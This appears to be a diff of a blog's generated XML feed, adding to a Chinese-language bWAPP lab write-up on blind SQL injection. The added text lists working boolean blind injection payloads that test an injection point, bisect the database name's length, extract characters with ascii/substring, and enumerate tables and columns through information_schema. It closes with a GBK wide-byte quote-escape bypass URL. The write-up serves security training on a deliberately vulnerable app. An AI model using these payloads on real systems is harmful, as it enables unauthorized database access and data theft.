@@ -3,10 +3,71 @@
   <entry>
     <title>bWAPP-SQLiBlind</title>
     <url>/2020/09/22/bWAPP-SQLiBlind/</url>
-    <content><![CDATA[<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922202427091.png" alt="image-20200922202427091"></p>
-<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922202435555.png" alt="image-20200922202435555"></p>
-<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922202448731.png" alt="image-20200922202448731"></p>
-<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>注入原理很简单, 就是编码, 一点一点分析:</p>
+    <content><![CDATA[<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">'</span><br><span class="line">' or 1=1<span class="comment">#</span></span><br><span class="line">' or 1=2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204246265.png" alt="image-20200922204246265"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204329452.png" alt="image-20200922204329452"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204338283.png" alt="image-20200922204338283"></p>
+<h3 id="2-判断数据库长度并逐个爆破-count-length-mid"><a href="#2-判断数据库长度并逐个爆破-count-length-mid" class="headerlink" title="2.判断数据库长度并逐个爆破(count/length/mid)"></a>2.判断数据库长度并逐个爆破(count/length/mid)</h3><ul>
+<li>使用length()函数判断数据库长度（二分法）</li>
+</ul>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 前面放回false 执行or 后面的语句如果返回true则数据库长度大于该值，反之小于</span></span><br><span class="line">' or length(database()) &gt;  8#</span><br><span class="line">' or length(database()) &gt;  4#</span><br><span class="line">' or length(database()) &gt;  6#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204457549.png" alt="image-20200922204457549"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204522341.png" alt="image-20200922204522341"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204636118.png" alt="image-20200922204636118"></p>
+<p>故数据库长度为5</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or length(database()) =  5<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204814865.png" alt="image-20200922204814865"></p>
+<ul>
+<li><p>逐个字符爆破数据库名</p>
+<p>使用<code>mid</code>或<code>substring</code>截取字符并逐个判断</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--' or ascii(mid(database(),1,1))&gt;110 #</span></span><br><span class="line">' or ascii(substring(database(),1,1))&gt;100 # （false）</span><br><span class="line">' or ascii(substring(database(),1,1))&gt;95 # (true)</span><br><span class="line">' or ascii(substring(database(),1,1))&gt;97 # (true)</span><br><span class="line">' or ascii(substring(database(),1,1))&gt;99 # (flase)</span><br><span class="line">' or ascii(substring(database(),1,1))= 98 <span class="comment"># (true)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922205443795.png" alt="image-20200922205443795"></p>
+<p>98对应为字符 b </p>
+<p><a href="https://tool.ip138.com/ascii_code/" target="_blank" rel="noopener">ascii码对照</a></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922205754286.png" alt="image-20200922205754286"></p>
+<p>以此类推得到表名</p>
+</li>
+</ul>
+<h3 id="爆破表的个数-长度-表名-count-length-mid"><a href="#爆破表的个数-长度-表名-count-length-mid" class="headerlink" title="爆破表的个数/长度/表名(count/length/mid)"></a>爆破表的个数/长度/表名(count/length/mid)</h3><ul>
+<li>爆破表的个数</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">’ or (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())&gt;<span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆破表的长度</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) &gt; <span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆破字符</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">100</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="爆破列个数-长度-列名-count-length-mid"><a href="#爆破列个数-长度-列名-count-length-mid" class="headerlink" title="爆破列个数/长度/列名(count/length/mid)"></a>爆破列个数/长度/列名(count/length/mid)</h3><ul>
+<li>爆破列的个数</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span>) &gt; <span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆破列的长度</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line"> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) &gt; <span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆破列名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or ascii(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line"> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">105</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>直接注入，可使用sqlmap进行注入</p>
+<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>采用了addslashed()和mysqli_real_escape_string()函数, </p>
+<p>且mysql编码和os编码一致, 无法用宽字节绕过,</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>注入原理很简单, 就是编码, 一点一点分析:</p>
 <p>假设一个url有注入, 但是有安全函数, 我们敲单引号会被过滤，那么怎么办呢？这时候就利用GBK双字节注入</p>
 <p>我们在后边这么构造url一个尝试:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.****.com&#x2F;index.php?id&#x3D;1%df&#39; and 1&#x3D;1</span><br></pre></td></tr></table></figure>
